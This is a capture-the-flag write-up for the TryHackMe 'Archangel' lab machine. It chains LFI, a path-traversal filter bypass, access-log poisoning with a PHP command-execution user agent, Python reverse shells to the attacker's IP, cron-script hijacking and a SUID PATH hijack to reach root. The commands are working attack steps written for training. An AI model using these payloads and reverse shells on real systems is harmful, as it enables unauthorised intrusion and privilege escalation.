# Archangel Writeup

Boot2root, Web exploitation, Privilege escalation, LFI


## ⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution:  [https://github.com/garthheff/CTF-Hints](https://github.com/garthheff/CTF-Hints/blob/main/archangel.md)

Room: https://tryhackme.com/room/archangel

## Enumeration

We start with a full TCP scan and service detection. Only SSH and HTTP are open, so the web application is the natural entry point.

```text
nmap 10.49.133.108 -p- -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-13 09:01 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.133.108
Host is up (0.00013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
```

## Find a different hostname

Opening the found HTTP page we find:

```text
Send us a mail: support@mafialive.thm
```

That gives us the alternate hostname.

Answer: `mafia....thm`

## Find flag 1

We add the hostname to our hosts file.

```text
echo "10.49.133.108 mafialive.thm" | sudo tee -a /etc/hosts
```

Browsing to `http://mafialive.thm/` we get the first flag.

Answer:

```text
UNDER DEVELOPMENT
thm{f0und_..._r1ght_...._...}
```

## Look for a page under development

A quick gobuster run is enough here. This is also reinforced by `robots.txt`.

```text
gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html, js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 59]
/.hta                 (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.           (Status: 403) [Size: 278]
/.hta.                (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.           (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 59]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
Progress: 23070 / 23075 (99.98%)
===============================================================
Finished
===============================================================
```

and `http://mafialive.thm/robots.txt`

```text
User-agent: *
Disallow: /test.php
```

Answer: `test.php`

## Find flag 2

Browsing to `http://mafialive.thm/test.php`

we get a page with a button and once pressed we see possible LFI

```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

At this point, source disclosure is the obvious next step. PHP filters are perfect for this.

We see if we can use a filter to obtain the source.

```text
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

This gives us base64 of the page source, we decode:

```text
echo "[REDACTED_BASE64_BLOB]" | base64 --decode
```

and get:

```text
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t..._...}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```

Flag found in source

Answer: `thm{explo1t..._...}`

This also shows us exactly how the filter works. The path must contain `/var/www/html/development_testing` and must not contain the exact string `../..`.

That means a normal traversal gets blocked, but a variant like `..//..//` or `.././.././` still works because the application is doing weak string matching rather than real path validation.

## Get a shell and find the user flag

Trying LFI escaping we get an error, the previous code shows us how we can LFI escape. Our path has to include `var/www/html/development_testing` and can not include `../..`

Easy, we can use `..//..` or `./../.` to change down a directory.

testing for common log poisoning files we find:

```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd=id
```

This prints the user-agent so we can set a custom user agent that contains PHP that allows us to run commands and then we can easily trigger a reverse shell command.

We used the following to achieve this. Note: use this exact format or you will break the access.log and you will have to restart the machine.

```text
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://mafialive.thm/
```

testing with and confirmed the log poisoning worked:

`http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd=whoami`

```text
[13/Apr/2026:14:10:07 +0530] "GET /test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd=whoami HTTP/1.1" 200 728 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0" 10.49.80.165 - - [13/Apr/2026:14:11:07 +0530] "GET / HTTP/1.1" 200 286 "-" "www-data "
```

That confirms code execution.

we setup a reverse shell listener:

```text
nc -lvnp 4444
```

we tried a few reverse shells and found this python one worked best:

```text
export RHOST="10.49.99.24";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

```text
 nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.49.133.108 52244
$ whoami
whoami
www-data
$ cd /home
cd /home
$ ls
ls
archangel
$ cd archangel
cd archangel
$ ls
ls
myfiles  secret  user.txt
$ cat user.txt
cat user.txt
thm{lf1_t0_..._...}
```

Answer: `thm{lf1_t0_..._...}`

## Find flag 3

`myfiles` is a dead end but still worth checking because it confirms the home directory layout and the more interesting `secret` directory.

```text
$ ls -la 
ls -la
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
```

`secret` is interesting.

we found `/opt/helloworld.sh` script in crontab:

```text
$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

we can write to the script running every minute running as archangel:

```text
ls -la /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```

```text
$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```

lets create a reverse shell using the reverse shell we know works:

```text
nc -lvnp 5555
```

```text
cat > /opt/helloworld.sh << 'EOF'  
#!/bin/bash  
export RHOST="10.49.72.196"  
export RPORT=5555  
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'  
EOF
```

```text
root@ip-10-49-72-196:~# nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.49.133.108 56420
$ whoami
whoami
archangel
$ id
id
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)

cd ~
cd secret
$ ls
ls
backup	user2.txt
$ cat user2.txt
cat user2.txt
thm{h0r1zont.._...}
```

Get User 2 flag

Answer: `thm{h0r1zont.._...}`

## Root the machine and find the root flag

Now that we are in `secret`, the `backup` binary is the obvious thing to inspect.

```text
$ ls -la
ls -la
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
```

```text
file backup
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
```

`strings` shows us we can likely exploit `cp` as it's not using the full path.

```text
$ strings backup
strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

So we create our own `cp` which makes a bash shell and root will execute it to give us a root bash.

```text
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/cp
```

making it executable:

```text
chmod +x /tmp/cp
```

adding environmental path so it triggers our `cp` not the real `cp`:

```text
export PATH=/tmp:$PATH
```

then run the backup to trigger our exploit:

```text
./backup
```

```text
$ ./backup
./backup
/tmp/cp: 1: /tmp/cp: -e: not found
root@ubuntu:~/secret# whoami
whoami
root
root@ubuntu:~/secret# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
thm{p4th_v4r1a..._...}
```

Answer: `thm{p4th_v4r1a..._...}`

## Final path

Web enum  
→ alternate hostname  
→ hidden development page  
→ LFI via weak include filter  
→ source disclosure with php filter  
→ traversal bypass using altered dot slash patterns  
→ access.log poisoning  
→ command execution as www-data  
→ cron abuse to become archangel  
→ SUID PATH hijack to become root
